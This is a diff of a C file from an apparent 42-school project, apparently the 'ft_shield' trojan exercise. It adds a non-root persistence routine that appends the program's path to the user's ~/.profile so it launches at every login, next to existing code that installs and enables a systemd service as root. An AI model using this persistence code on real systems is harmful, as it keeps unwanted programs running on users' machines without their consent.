@@ -6,11 +6,27 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:21 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/04 10:06:14 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/04 10:17:47 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ctx.h"
+
+char	*strjoin(char *s1, char *s2)
+{
+	char	*dest;
+	size_t	len;
+
+	if (!s1)
+		return (NULL);
+	len = (strlen(s1) + strlen(s2) + 1);
+	dest = malloc(len * sizeof(char));
+	if (dest == NULL)
+		return (NULL);
+	strcpy(dest, s1);
+	strcat(dest, s2);
+	return ((char *)dest);
+}
 
 static int	setup_service(bool root)
 {
@@ -25,6 +41,33 @@ static int	setup_service(bool root)
 		write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
 		system(SERVICE_START);
 		system(SERVICE_ENABLE);	
+	}
+	else
+	{
+		char	*home_path = getenv("HOME");
+		if (!home_path)
+			return (0);
+		char	*profile_file_path = strjoin(home_path, "/.profile");
+		if (!profile_file_path)
+			return (0);
+		char	*executable_path = strjoin(home_path, "/binft_shield\n");
+		if (!executable_path)
+		{
+			free(profile_file_path);
+			return (0);
+		}
+
+		int	fd = open(profile_file_path, O_CREAT | O_WRONLY | O_APPEND, 0777);
+		if (fd == -1)
+		{
+			free(profile_file_path);
+			free(executable_path);
+			return (0);
+		}
+		write(fd, executable_path, strlen(executable_path));
+		free(profile_file_path);
+		free(executable_path);
+		close(fd);
 	}
 	return (1);
 }
